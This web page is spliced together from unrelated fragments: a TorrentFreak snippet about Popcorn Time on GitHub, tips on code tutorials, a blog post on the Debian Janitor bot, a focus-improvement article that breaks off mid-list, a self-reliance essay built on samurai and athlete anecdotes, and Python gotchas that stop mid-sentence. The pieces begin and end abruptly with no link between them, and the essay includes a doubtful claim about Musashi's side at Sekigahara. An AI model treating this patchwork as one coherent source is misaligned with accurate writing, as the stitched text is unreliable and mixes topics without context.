<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

How to tackle it? What makes for a good tutorial? How do we measure the effectiveness of a code tutorial correctly?</p>
<p>We covered dozens of tutorials and approaches at different companies and organisations, and here are the 5 elements we found every code tutorial has to have. We’re willing to go as far off and say: if your onboarding tutorials do not meet the following criteria - you probably shouldn’t bother creating them in the first place.</p>
<h2>What Makes a Code Tutorial Effective?</h2>
<p>While providing your engineers with code tutorials can be a time consuming task for everyone, tutorials pose some innate benefits that will help keep your onboarding programs effective and sustainable and internal knowledge sharing levelled up.</p>
<p><strong>Great code tutorials are:</strong></p>
<ol>
<li>Focused - highlighting just the part of the repo which your engineer needs to learn to get started. If the readers need to look through dozens of paragraphs to find what they were looking for, they might not even bother searching. In other words, tutorials are not like your history essay from high-school - You lose points for length and breadth.</li>
<li>Highlight the “Why”. They show a clear explanation of the logic behind the code and/or why it is like it is now.</li>
<li>They show a process rather than the mere solution. It’s much easier to understand code by seeing the process of its creation or the flow of information, rather than just looking at a freeze frame of what it looks like now.</li>
<li>Tinkering - they enable a sandbox experience or learning by doing. It’s similar to getting thrown a task from the backlog in the sense that it is hands on, however it is structured, and guided in a way that evokes deductively understanding codebase logic, and also does not require the time and investment a backlog task would.</li>
<li>Up to date. They have to be practical and up to date with the current code. What usually kills good tutorials is if they are outdated. Not only will they waste the reader’s time, they might cause actual damage by misleading. This is the number one reason that many engineers distrust tutorials, and documentation in general.</li>
</ol>
<h2>Recap</h2>
<p>Good tutorials are hard to make and maintain. Although, easier said than done, the key is to keep them updated, focused and encourage an independent learning process. The next step to tune-it up, would be to make sure we measure the effectiveness of our tutorials (more on that in a future post), and gather feedback to improve over time.</p>

October 25, 2020 | https://jelmer.uk/debian-janitor.html | <a href="https://web.archive.org/web/*/https://jelmer.uk/debian-janitor.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div>
        <div>
            <section>
                
            </section>
            <!-- TL;DR
=====

The `Janitor <https://janitor.debian.net/>` is a new bot that automatically
proposes improvements for Debian packages maintained in Git. -->
<!-- Problem statement -->
<p>There are a lot of small changes that can be made to the Debian archive to
increase the overall quality. Many of these changes are small and have just
minor benefits if they are applied to just a single package. Lintian encourages
maintainers to fix these problems by pointing out the common ones.</p>
<p>Most of these issues are often trivially fixable; they are in general an
inefficient use of human time, and it takes a lot of effort to keep up with.
This is something that can clearly be automated.</p>
<p>Several tools (e.g. onovy's <a href="https://github.com/onovy/onovy-mass">mass tool</a>,
and the <a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> tool
that I've been working on) go a step further and (for a subset of the issues
reported by lintian) fix the problems for you, where they can.  Lintian-brush
can currently fix most instances of <a href="https://salsa.debian.org/jelmer/lintian-brush#supported-tags">close to 100 lintian tags</a>.</p>
<p>Thanks to the Vcs-* fields set by many packages and <a href="https://docs.gitlab.com/ee/api/">the APIs provided by hosting
platforms like Salsa</a>, it is now possible to
proactively attempt to fix these issues.</p>
<p>The Debian Janitor is a tool that will run lintian-brush across the entire
archive, and propose fixes to lintian issues via pull request.</p>
<div id="objectives">
<h2>Objectives</h2>
<p>The aim of Debian Janitor is to take some drudge work away from Debian
maintainers where possible, so they can spend their time on more important
packaging work.  Its purpose is to make automated changes quick and easy to
apply, with minimal overhead for package maintainers. It is essentially a bit
of infrastructure to run lintian-brush across all of the archive.</p>
<p>The actions of the bot are restricted to a limited set of problems for which
obviously correct actions can be taken. It is not meant to automate all
packaging, or even to cover automating all instances of the issues it knows
about.</p>
<p>The bot is designed to be conservative and delight with consistently correct
fixes instead of proposing possibly incorrect fixes and hoping for the best.
Considerable effort has been made to avoid the janitor creating pull requests
with incorrect changes, as these take valuable time away from maintainers, the
package doesn't actually improve (since the merge request is rejected) and it
makes it likelier that future pull requests from the Debian Janitor bot are
ignored or rejected.</p>
<p>In short: The janitor is meant to propose correct changes if it can, and back
off otherwise.</p>
</div>
<div id="design">
<h2>Design</h2>
<p>The Janitor finds package sources in version control systems from the Vcs*-
control field in Debian source packages. If the packaging branch is hosted on a
hosting platform that the Janitor has a presence on, it will attempt to run
<a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> on the packaging branch and (if there are any changes made)
build the package and
propose a merge. It is based on
<a href="https://github.com/jelmer/silver-platter/">silver-platter</a> and currently has
support for:</p>
<ul>
<li><a href="https://salsa.debian.org/">Salsa</a></li>
<li><a href="https://github.com/">GitHub</a></li>
<li><a href="https://launchpad.net/">Launchpad</a></li>
<li><a href="https://gitlab.com/">GitLab</a></li>
</ul>
<p>The Janitor is driven from the lintian and vcswatch tables in
<a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a>. It queries for packages
that are affected by any of the <a href="https://lintian.debian.org/">lintian</a> tags
that <a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> has a
fixer script for. This way it can limit the number of repositories it has to
process.</p>
</div>
<div id="ensuring-quality">
<h2>Ensuring quality</h2>
<p>There are a couple of things I am doing to make sure that the Debian
Janitor delights rather than annoys.</p>
<div id="high-quality-changes">
<h3>High quality changes</h3>
<p>Lintian-brush has end-to-end tests for its fixers.</p>
<p>In order to make sure that merge requests are useful and high-value, the bot
will only propose changes from lintian-brush that:</p>
<ul>
<li>successfully build in a chroot and pass <a href="https://wiki.debian.org/ContinuousIntegration/autopkgtest">autopkgtest</a> and <a href="https://wiki.debian.org/piuparts">piuparts</a>;</li>
<li>are not completely trivial - e.g. only stripping whitespace</li>
</ul>
<p>Changes for a package will also be reviewed by a human before they make it into
a pull request.</p>
</div>
<div id="one-open-pull-request-per-package">
<h3>One open pull request per package</h3>
<p>If the bot created a pull request previously, it will attempt to update the
current request by adding new commits (and updating the pull request
description). It will remove and fix the branch when the pull request conflicts
because of new upstream changes.</p>
<p>In other words, it will only create a single pull request per package and will
attempt to keep that pull request up to date.</p>
</div>
<div id="gradual-rollout">
<h3>Gradual rollout</h3>
<p>I'm slowly adding interested maintainers to receiving pull requests, before
opening it up to the entire archive. This should help catch any widespread
issues early.</p>
</div>
<div id="providing-control">
<h3>Providing control</h3>
<p>The bot will be upfront about its pull requests and try to avoid overwhelming
maintainers with pull requests by:</p>
<ul>
<li>Clearly identifying any merge requests it creates as being made by a bot.
This should allow maintainers to prioritize contributions from humans.</li>
<li>Limiting the number of open proposals per maintainer. It starts by opening a
single merge request and won't open additional merge requests until the first
proposal has a response</li>
<li>Providing a way to opt out of future merge requests; just a reply on the
merge request is sufficient.</li>
</ul>
<p>Any comments on merge requests will also still be reviewed by a human.</p>
</div>
</div>
<div id="current-state">
<h2>Current state</h2>
<p>Debian janitor is running, generating changes and already creating merge
requests (albeit under close review). Some examples of merge requests it has
created:</p>
<ul>
<li><a href="https://salsa.debian.org/i3-team/i3-wm/merge_requests/1">i3 (on Salsa)</a></li>
<li><a href="https://salsa.debian.org/wouter/nbd/merge_requests/2">nbd (on Salsa)</a></li>
<li><a href="https://code.launchpad.net/~debian-janitor/friendly-recovery/lintian-fixes/+merge/375943">friendly recovery (on Launchpad)</a></li>
<li><a href="https://github.com/algernon/dh-exec/pull/3">dh-exec (on GitHub)</a></li>
</ul>
<div id="using-the-janitor">
<h3>Using the janitor</h3>
<p>The janitor can process any package that’s maintained in Git and has its
Vcs-Git header set correctly (you can use
<a href="https://qa.debian.org/cgi-bin/vcswatch">vcswatch</a> to check this).</p>
<p>If you're interested in receiving pull requests early, leave a comment below.
Eventually, the janitor should get to all packages, though it may take a while
with the current number of source packages in the archive.</p>
<p>By default, salsa does not send notifications when a new merge request for one
of the repositories you're a maintainer for is created. Make sure you have
notifications enabled in
<a href="https://salsa.debian.org/profile/notifications">your Salsa profile</a>,
by ticking "New Merge Requests" for the packages you care about.</p>
<p>You can also see the number of open merge requests for a package repository on
<a href="https://qa.debian.org/developer.php">QA</a> - it's the ! followed by a number in the
pull request column.</p>
<p>It is also possible to download the diff for a particular package (if it's been
generated) ahead of the janitor publishing it:</p>
<div><pre><span></span><span> $</span> curl https://janitor.debian.net/api/lintian-fixes/pkg/PACKAGE/diff
</pre></div>
<p>E.g. for i3-wm, look at
<a href="https://janitor.debian.net/api/lintian-fixes/pkg/i3-wm/diff">https://janitor.debian.net/api/lintian-fixes/pkg/i3-wm/diff</a>.</p>
</div>
</div>
<div id="future-plans">
<h2>Future Plans</h2>
<p>The current set of supported hosting platforms covers the bulk of packages in
Debian that is maintained in a VCS.  The only other 100+ package platform
that's unsupported is <a href="https://salsa.debian.org/dgit-team/dgit">dgit</a>. If you
have suggestions on how best to submit git changes to dgit repositories (BTS
bugs with patches? or would that be too much overhead?), let me know.</p>
<p>The next platform that is currently missing is
<a href="https://bitbucket.org/">bitbucket</a>, but there are only about 15 packages in
unstable hosted there.</p>
<p>At the moment, lintian-brush can fix close to 100 lintian tags. It would be
great to add fixers for more common issues.</p>
<p>The janitor should probably be more tightly integrated with other pieces of
Debian infrastructure, e.g. Jenkins for running jobs or linked to from the
<a href="https://tracker.debian.org/">tracker</a> or
<a href="https://lintian.debian.org/">lintian.debian.org</a>.</p>

<h2>More information</h2>
<p>See <a href="https://janitor.debian.net/lintian-fixes/#faq">the FAQ on the homepage</a>.</p>
<p>If you have any concerns about these roll-out plans, have other ideas or
questions, please let me know in the comments.</p>

       <p><img src="https://www.deprocrastination.co/assets/illustrations/how_to_focus_candle.png" referrerpolicy="no-referrer" alt="How to Focus in the Age of Distraction"></p>
       <p>Why can't we focus anymore? Why is it so difficult to focus on reading, studying, or thorough problem solving?</p>
       <p>Before we dive into the actionable part, here are some simple reasons why it's harder than ever to focus.</p>
       
       <h2>Why we can't focus</h2>
       <h4><strong>Reason #1: we process more information than ever.</strong></h4>
       <p>According to researchers from the University of California-San Diego, we consume through our phones, laptops, TVs and all other devices about&nbsp;<a target="_blank" href="https://ijoc.org/index.php/ijoc/article/viewFile/1566/743">34 GB of information per day.</a></p>
       <p>The researchers say this leads to an information overload that hampers our focus and leads to constant interruptions that prevent us from reflection and deeper thinking.</p>
       
       
       <h4><strong>Reason #2: filtering out information takes effort.</strong></h4>
       <p>Contrary to common sense,&nbsp;<strong>ignoring things is not a passive mental process.</strong></p>
       <p>Researchers have found that&nbsp;<strong>it takes energy to ignore irrelevant stimuli.</strong></p>
       <p>In the Distracted Mind, neuroscientist Adam Gazzaley writes:</p>
       <blockquote><p>What we learned from this experiment was that the act of ignoring is not a passive process; rather, the goal to ignore something is an active one that is mediated by the top-down suppression of activity below baseline levels of passively viewing.</p>
       <p><a target="_blank" href="https://www.ncbi.nlm.nih.gov/pubmed/15814009">(Source)</a></p>
       </blockquote>
       <p>It's not just about focusing better, but also about&nbsp;<em>ignoring better.</em></p>
       
       
       <h4><strong>Reason #3: we're being trained like mice by a variable-ratio reward schedule.</strong></h4>
       <p>Every like on social media, every notification, every email represents something&nbsp;<em>new!!!</em></p>
       <p><em>New</em>&nbsp;is exciting for us. Every such message releases the&nbsp;<a target="_blank" href="http://sitn.hms.harvard.edu/flash/2018/dopamine-smartphones-battle-time/">neurotransmitter dopamine</a>&nbsp;in our heads, making us feel good and adventurous.</p>
       <p><em>What if my crush sent me a message?</em><br>
       <em>What if I got that job?</em><br>
       <em>What if a friend wants to meet up and hang?</em></p>
       <p>Unlike in the past, now we carry with us devices that enable us to check if the above is true in about 3 seconds.</p>
       <p>How are we then supposed to do work which may require serious mental effort when we have dopamine-candy within our reach almost 24/7?</p>
       
       <p><strong>We process more information than ever, so filtering out the noise takes a lot of effort, and we're constantly being led astray from focus by dopamine-loaded interruptions. No wonder we can't focus.</strong></p>
       
       <h2>How to improve focus</h2>
       <p>Given that ignoring is an active process, we'll suggest ways to both ignore noise better and focus on the signal better.</p>
       <h3>Strategic focus vs task focus</h3>
       <p>Before we go any further, we'll split focus into 2 types:</p>
       <ul>
       <li><strong>1. Strategic focus</strong><br>
       Answering the question: What to focus on?</li>
       <li><strong>2. Task focus</strong><br>
       Answering the question: How do I focus on work?</li>

       </ul>
       
       <h3>1. How to improve strategic focus</h3>
       <p>Let's start with the obvious.</p>
       
       <h4>Define what you want to focus on</h4>
       <p>It's hard to focus on something if you don't know what it is.</p>
       <p>If you're looking into a heavy fog, there's nothing to focus on. Same goes for mental fog.</p>
       <p>While it's becoming popular to say "systems &gt; goals" or even "no goals" at all, we are goal-driven by nature.</p>
       <p>On a neural level, we filter information through our goals. Our perception of reality is to a large extent driven by goals.</p>
       <p>As neuroscientist Adam Gazzaley writes in the Distracted Mind:</p>
       <blockquote><p>... the inward flow of information is sculpted and pruned by goals in much the same way that our actions are, resulting in our perceptions being an interpretation of reality and not a veridical representation.</p>
       </blockquote>
       <p>In other words, when you're looking for Waldo, your mind activates neural circuits to find someone in a red-striped shirt and ignores almost all else.</p>
       <p>Your goal determines your perception of reality. You're more likely to spot information relevant to your goal than all other information out there.</p>
       <p>If you have a clear goal, it will be that much easier to spot the right information to help you achieve it and ignore the noise.</p>
       <p>Which brings us to this question:<br>
       <strong>What do you want to do?</strong></p>
       <p>Make a list.</p>
       <p>Once you have some sort of a list, it's not yet time to pursue all the items on it.</p>
       <p>It's time to prioritize and refine.</p>
       
       <h4>Define what&nbsp;<em>not</em>&nbsp;to focus on - use Warren Buffett's goal setting method</h4>
       <p>Once you have any kind of a list of things you'd like to accomplish, it's not yet time to pursue goals. That would be unfocused.</p>
       <p>Here's Warren Buffett's advice on goals:</p>
       <ol>
       <li>Write down the top 25 goals that you want to achieve in life.</li>
       <li>Select the 5 that matter the most.</li>
       <li>Forget the rest.</li>

       </ol>
       <p>Buffett highlights that pursuing all 25 will distract you. It will lead to a haphazard, unfocused approach that likely won't lead to results.</p>
       <p>The general principle of picking fewer goals than you think you want can be applied every day. It's a safeguard against the tendency to pick too many goals and diffuse your efforts.</p>
       
       <h4>Find 2 Wildly Important Goals<br>(and put them where you'll see them)</h4>
       <p>In 4 Disciplines of Execution, the authors recommend finding 2 wildly important goals (WIGs).</p>
       <p>WIGs are goals that are so important that if you achieve them, everything else will likely work out.</p>
       <p>They also recommend putting your goals into a specific format:<br>
       <strong>X to Y by when.</strong></p>
       <p>If you were to define the 2 Wildly Important Goals to focus on, what would they be?</p>
       <ul>
       <li>Get to $10 000 in revenue by July 1.</li>
       <li>Write 50 000 words by August 31st.</li>
       <li>...</li>

       </ul>
       <p><strong>Define your goals to have a clear target to focus on.</strong></p>
       <p>However, that's not enough. You can write down the goals and forget them. Completely.</p>
       <p>You need to be hyper-aware of those goals, so that they stay on your mind even through the daily turmoil of life.</p>
       <p>How to do that?</p>
       <p>How to focus on goals that matter despite the noise? </p>
       
       <h4>Create an ambient visual reminder for WIGs</h4>
       <p>Once you have clear goals, you need to make them obvious to you every day.</p>
       <p>To do that, we recommend creating an ambient visual reminder.</p>
       <p>A post-it note written with a thick marker on your desk.<br>
       A big poster above your door.<br>
       A timeline on a whiteboard.</p>
       <p>Something in your&nbsp;<em>physical</em>&nbsp;(not digital) environment.</p>
       <p>The trouble with a digital environment is that if you have a goal written in a to-do app of some sort, once you close it it's out of sight out of mind. If you don't open the app in the morning, you don't get reminded of the goal.</p>
       <p><strong>Create a highly visual reminder for your goals and place it in your surroundings so that you see it every day. Every time you glance at it, it will remind you to focus.</strong></p>
       
       <h4>Strategic focus - summary</h4>
       <ol>
       <li><strong>Define what to focus on.</strong><br>
       Make a written list.</li>
       <li><strong>Select only the top-most items from that list - ideally 2 items.</strong><br>
       Decide to explicitly&nbsp;<em>not</em>&nbsp;focus on other, less important goals at the moment.</li>
       <li><strong>Phrase them in the following way: From X to Y by when.</strong></li>
       <li><strong>Place a visual reminder in your surroundings.</strong><br>
       Put it somewhere in your physical environment where it's impossible to miss.</li>

       </ol>
       <p>If you do this, you will become hyper-aware of when you're moving towards your most important goals, and when you're not. What you need to focus on will stay at the top of your mind, instead of being forgotten.</p>
       
       
       <h3>2. How to improve task focus</h3>
       <p>Once you know what to focus on, it's time to focus on it.</p>
       <p>As we mentioned before, ignoring irrelevant stimuli is not a passive process. It takes effort.</p>
       <p>It makes sense to divide improving concentration into 2 parts:</p>
       <ul>
       <li>Improve ignoring</li>
       <li>Improve concentration</li>

       </ul>
       <p>Let's get into it.</p>
       
       <h4>How to ignore better</h4>
       <p>To minimize the effort required to ignore irrelevant stimuli, either remove them if you can, or use something to make it easier to block out the noise.</p>
       <ul>
       <li><p><strong>Put on noise-canceling headphones.</strong><br>
       This is taking the&nbsp;<em>ignore the noise</em>&nbsp;literally. Background noises can disrupt our attention (especially true for people with ADD/ADHD). Whether it is your neighbors arguing or a&nbsp;<em>PING!</em>&nbsp;of a notification, if you can't hear them, you don't need to take the effort to filter them out.</p>
       </li>
       <li><p><strong>Find a quiet place to work.</strong><br>
       Sometimes even noise-canceling headphones aren't enough, in that case a public library or an empty class/conference room might do wonders. Even a different room can work.</p>
       </li>
       <li><p><strong>Declutter.</strong><br>
       Headphones will help with auditory clutter, but what about visual clutter?<br>
       If you have 50 post-its with ideas and to-do lists in sight, it'll take more effort to not glance at them. Remove them.<br>
       Same goes for 25 open browser tabs. Close them or go into fullscreen mode.</p>
       </li>
       <li><p><strong>Batch distracting activities.</strong><br>
       If you need to respond to emails or work requests as they come, learn to ignore them, if for but a moment.<br>
       Deal with emails once every 30 minutes, or once an hour, instead of checking it randomly whenever you get a tiny bit bored or stressed.<br>
       Minimize the number of switches between tasks.</p>
       </li>
       <li><p><strong>Minimize distractions before a work session.</strong></p>
       <p>The phone is a distraction machine. Sure, we can use it productively, but when it's sitting on our desks during work, it's a constant reminder that we could be doing something&nbsp;<em>fun</em>&nbsp;instead.<br>
       Here are our suggestions on minimizing digital distractions:</p>
       <ul>
       <li>Use the&nbsp;<strong>Rule of 3 Senses: hide your phone out of sight, reach, and hearing.</strong><br>
       Put your phone where you can't see, reach it, or hear it. A drawer or a backpack both work.</li>
       <li><strong>Block distracting sites on your computer.</strong><br>
       You can use&nbsp;<a target="_blank" href="https://www.deprocrastination.co/home">our extension</a>&nbsp;or some other extension that performs the same function - blocking distracting sites in your browser. When you don't have the option of opening a new YouTube tab and going down a rabbit hole, you can focus better.</li>

       </ul>
       </li>

       </ul>
       
       <h4>How to concentrate better</h4>
       <p>Now that we have less to ignore, how to really hone in on work?</p>
       <ul>

    </figure>
        
        <p>Picture this: An injured Japanese Samurai warrior finds himself in search of a place of rest in a quiet bamboo forest. He quietly steps over any fallen branches, fearing that the noise would attract unwanted visitors. Despite his careful footing, he trips and catches his fall on a large bamboo trunk and thus makes a noise loud enough that it weaves and traverses through the woods. As the echo leaves, a new noise returns. Sounds of pacing footsteps and heavy armour start to make their way toward him.</p>
<p>Enemies have become aware of the lonely warrior’s presence.</p>
<p>The samurai now has a detrimental problem on his hands. He must act fast, utilising <em>any</em> available means. What he cannot do, is lament the possibilities of what he could have carried with him. During the battle that leads to this very moment, the warrior had injured himself badly and even lost his only sword to a lethal opposition. Thinking about how he could have defended himself with the sword which he no longer possessed, would be pointless. He would become stuck in a kind of paralysis that would only bring him a sense of loss and a lack of confidence in his next decision.</p>
<p>Luckily, the warrior instead ignores this ephemeral thought and gets to work: grabbing a fallen branch to tie any loose possessions he was carrying onto his back, the warrior began to climb one of the wider trunks. Despite struggling, at this point, the noise was not a concern for the samurai as he knew the approaching soldiers were making more in their charge, meaning that they would likely not notice his climb.</p>
<p>Now, much higher up and out of sight, the warrior slings his bag around the tree and uses it as a means to tie himself to the wood – providing himself with more time up that very tree. He let the impatient, opposing samurai that were searching the forest in hopes of slashing the heads off any remaining fighters – to pass by. The warrior was now safe.</p>
<p>The wisdom learnt from a story like this would echo for years as writers such as <a href="http://daretolivewithoutlimits.com/about-us/" rel="noopener noreferrer" target="_blank">Bryan Golden</a> would point out that, ‘wishing for something one doesn’t have wastes time while accomplishing nothing’. To understand why this kind of thinking is paramount to avoid, you must first educate yourself on the importance of your ability to <em>work with what you have</em>.</p>
<p>Our world thrives in moments when the individuals who occupy it are useful.</p>
<p>Defined mainly by creations that provide higher meaning and value to humanity; usefulness seems like an obvious goal for you to have in mind. Instead, subtle yet devastating distractions may snatch ambition and desire away from you; leaving you dependent on things which present very little in meaning or fulfilment.</p>
<p>Your dependency, however, is not to things which are in your immediate grasp. It is instead to the theoretical, a realm of ideas in which you exercise your thinking but refuse give power to move you into useful action. This dependency also brings with it dangers which may leave you powerless: unable to control the path in which you will travel on, through life.</p>
<p>Those who are most formidable in life, who have built great businesses, art and legacies of usefulness, are those who have utterly mastered the art of <em>self-reliance</em>. This art is one that you must aim to deeply immerse yourself in.</p>
<p>Self-reliance brings with it the power to do great things. Self-reliance provides true confidence, leadership and a lack of compromising dependencies. Whilst there are many means to amplify this self-reliance, one to immediately develop is to learn to <strong><em>work with what you have</em></strong>.</p>
<p>American athlete, Arthur Ashe famously stated that you should ‘start where you are. Use what you have. Do what you can.’ And whilst this may seem at first read, to be blindly optimistic – it is in fact, extremely practical advice. There are plentiful examples of those who have used what is within their means, utilising time, creativity and an intense acceptance for reality, in order to create and achieve. They let go of any dependencies they had and understood that, as Bryan Golden elegantly wrote: ‘opportunities are missed due to inaction… inaction results from waiting for ideal conditions’.</p>

<p>Throughout life, you must look to these opportunities and must do so by cleverly using what tools you have in your grasp; rather than leaving your hands open, expecting your equipment to change. Think of the following stories as examples of the necessary steps to move you toward this way of creativity and self-reliance.</p>
<h2>Use time wisely</h2>
<p><a href="https://www.youtube.com/watch?v=78I9dTB9vqM" rel="noopener noreferrer" target="_blank">David Goggins</a> is considered to be one of the most elite endurance athletes in the world. In his many achievements, a stand out feat for Goggins would be his triumphant completion of the Badwater Ultra Marathon. This particular marathon demands a gruelling 135 miles from each runner. Not only does it require this unimaginable distance, but it drags those who brave the run through the sweltering and soul-torturing desert of Death Valley, California.</p>
<p>Goggins crossed the finish line of Badwater Ultra Marathon at the time of 25:49:40.</p>
<p>Due to his prolific notoriety, many of those who follow Goggins’ efforts already know this staggering statistic and achievement. Despite this, many do not know that David Goggins actually set out to start running Ultramarathons at a point in his life when he had never run before. Ignoring the more standard choice of slowly progressing up in distances, Goggins threw himself into the deep end. Upon choosing between whether to sink or swim; Goggins designed, what would later become, his daily running routine.</p>
<p>His routine was (and still is) as follows:</p>
<p>Each morning Goggins arises at 3 am, allowing for a bursting start with a run of between 10-15 miles. Riding this energetic start, he hops onto his bicycle for a 25-mile commute to work. It’s lunchtime. Goggins finds time for another run. Here, he sneaks in 5-8 miles. Following a hard day’s work; Goggins finds himself locked in a commitment, previously made on his commute <em>to</em> work, as he is demanded to cycle another 25 miles back home.</p>
<p>But David Goggins doesn’t stop there. He refuses for tiredness to seep into his routine and proceeds to allow his will to drive him back out and onto a final 3-5 mile run.</p>
<p>When thinking about fitting in work to pursue a passion or work on a side-project, those who have full-time jobs may utter such phrases such as ‘if only I had more time’ or ‘I am always so busy’, but Goggins, whilst running his countless miles every day – also maintained a full-time career. When working with what you have, you must make sure to use the most precious resource you have, wisely. Seneca wrote in his prolific text, <em><a href="https://amzn.to/2IcioVj" rel="noopener noreferrer" target="_blank">On the Shortness of Life</a></em>, how ‘it is not that we have so little time but that we lose so much’.</p>
<p>Another example you should look to, to understand how time can be mastered, comes from the legendary story of the wandering samurai warrior: Miyamoto Musashi. Known mainly for his intense dedication to the craft of swordsmanship, Musashi’s status places him among the <a href="https://justincampbellplatt.com/blog/deadly-samurai">greatest warriors</a> who have ever lived. Besides his mastery of the sword, the lone fighter was a devoted student of strategy and in his later life, wrote his book on the art of strategy: <a href="https://amzn.to/2IhpZxR" rel="noopener noreferrer" target="_blank"><em>The Book of Five Rings</em></a>. Amongst the many strategies that Musashi would take advantage of, one stands out to those who wish to utilise time effectively.</p>

<p>For most <em>Shugyou-Sho</em> (lone-wondering fighters), ‘<em>borrowing the battlefield’</em> meant flocking to any major battle in an attempt to be noticed by either a Shogun or Daimyo in hopes to be granted the respected status of a Samurai.</p>
<p>But what Musashi saw in this strategy, was a deeper, more powerful underlying opportunity. One that may not have paid him the economic rewards or stature in the short-term, but instead would have provided him with incredibly intense and real practice for the art of swordsmanship.</p>
<p>The Battle of Sekigahara was a conflict that saw the last military dictatorship of Japan being established. The battle took place two years following the death of Toyotomi Hideyoshi, who had previously succeeded in unifying Japan without having to become Shogun. This left the country under rule of his five-year-old son. Musashi fought on the side of the Ashikaga Clan against the oncoming army of Ieyasu Tokugawa. However, he and the army he had tied himself to, lost and many of the army were even massacred following the fight. Musashi, luckily, managed to survive.</p>
<p>Now of course, it cannot be denied that this was presenting the 17-year-old, unemployed warrior with the opportunity to be noticed by those higher up the rank; but this was not Musashi’s sole intention. His main motivation was having the opportunity to practice the craft of swordsmanship in an environment where the stakes were of life and death and the enemies were in plentiful supply. And whilst the potential benefits of being noticed did appeal to the fighter; it did not distract young Musashi, and in fact, acted more so as an increase in the already high-demanding benchmark for success.</p>
<p>Miyamoto Musashi <em>lived</em> his art – and his immense dedication should not be taken lightly. ‘There is nothing outside of yourself that can ever enable you to get better, stronger, richer, quicker, or smarter. Everything is within. Seek nothing outside of yourself.’ These words prove that Musashi clearly mastered the art and realisation of self-reliance. This desire to excel in his craft came from within. If Musashi were <em>borrowing the battlefield</em> with only the desire to be granted the title of Samurai, Musashi may not have excelled in the same way.</p>

<p>I confess that this one has costed me several hours of my life. When used correctly it is very nice but when you don’t, it’s a headache.</p>
<p>In Python you can concatenate strings using not only using the <code>+</code> operator but also implicitly. The following snippet illustrates a very common bug in Python.</p>
<pre><code>In [<span>2</span>]: <span>"french "</span> + <span>"bulldog"</span>
Out[<span>2</span>]: <span>'french bulldog'</span>
</code></pre>
<p>That's fine, <code>&lt;string&gt; + &lt;string&gt;</code> generates a new <code>&lt;string&gt;</code>. But what you may not know is that you can leave <code>+</code> out and Python will still concatenate the string.</p>
<pre><code>In [<span>3</span>]: <span>"french "</span> <span>"bulldog"</span>
Out[<span>3</span>]: <span>'french bulldog'</span>
</code></pre>
<p>When is this a problem, then? It'll be an issue when you want a list of strings and forget a comma.</p>
<pre><code>In [<span>4</span>]: dogs = [<span>"poodle"</span> <span>"french bulldog"</span>, <span>"pit bull"</span>, <span>"american bully"</span>]
In [<span>6</span>]: dogs
Out[<span>6</span>]: [<span>'poodlefrench bulldog'</span>, <span>'pit bull'</span>, <span>'american bully'</span>]
</code></pre>
<p>Oh, it can get worse. Imagine you have a function that accepts two strings, but the second one is optional.</p>
<pre><code>In [<span>11</span>]: <span><span>def</span> <span>print_pair</span>(<span>a: str, b: Optional[str] = None</span>):</span>
    ...:     print(<span>"a: "</span>, a, <span>"b: "</span>, b)
In [<span>13</span>]: print_pair(
    ...: <span>"First string"</span>
    ...: <span>"Second string"</span>
    ...: )
a:  First stringSecond string b:  <span>None</span>
</code></pre>
<p>You see? The function runs just fine, so that’s not great! Situations like these can hide nasty bugs. The lesson here is clear: be careful when passing strings to functions or using them as list of items.</p>
<h2 id="walrus-wat">Walrus WAT!?</h2>
<p><img src="https://media.giphy.com/media/cv4aHA3NS4YxO/giphy.gif" alt="A dog playing goes #fail"></p>
<p>In 2019, Python 3.8 introduced the walrus operator. This new feature generated a lot of controversies. Some people loved whereas other actually hated it. The goal of this post is not to debate that, so I’ll dive right into what makes walrus confusing.</p>
<p>Before Python 3.8, you could not assign a value to a variable and test if it was “truthy” in the same statement.  For example, see the following example, of reading data from a socket until an empty string is read. This examples is inspired by  <a target="_blank" href="https://www.python.org/dev/peps/pep-0572/#capturing-condition-values">one</a>  described in the PEP.</p>
<p>Without <code>walrus</code>:</p>
<pre><code>data = sock.recv(<span>4096</span>)
<span>while</span> data:
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
    data = sock.recv(<span>4096</span>)
</code></pre>
<p>With <code>walrus</code>:</p>
<pre><code><span>while</span> data := sock.recv(<span>4096</span>):
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
</code></pre>
<p>That is, you do both the assignment and the checking in the same line by using <code>:=</code>.</p>
<p>In Python we can use tuples to assign values to more than one variable in the same line.</p>
<pre><code>In [<span>1</span>]: a, b = <span>2</span>, <span>3</span>

In [<span>2</span>]: a
Out[<span>2</span>]: <span>2</span>

In [<span>3</span>]: b
Out[<span>3</span>]: <span>3</span>
</code></pre>
<blockquote>
<p>Hum... we probably can do the same using walrus, right?</p>
</blockquote>
<pre><code>In [<span>4</span>]: (a, b := <span>16</span>, <span>19</span>)
Out[<span>4</span>]: (<span>2</span>, <span>16</span>, <span>19</span>)
</code></pre>
<blockquote>

<p>Thanks to  <a target="_blank" href="https://www.reddit.com/user/ForceBru/">@ForceBru</a> who kindly  <a target="_blank" href="https://www.reddit.com/r/Python/comments/jh66bh/how_to_shoot_yourself_in_the_foot_with_python/g9wfoi9/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">corrected me</a>, what gets assigned to <code>b</code> is not a tuple, but only the first element after <code>:=</code>.
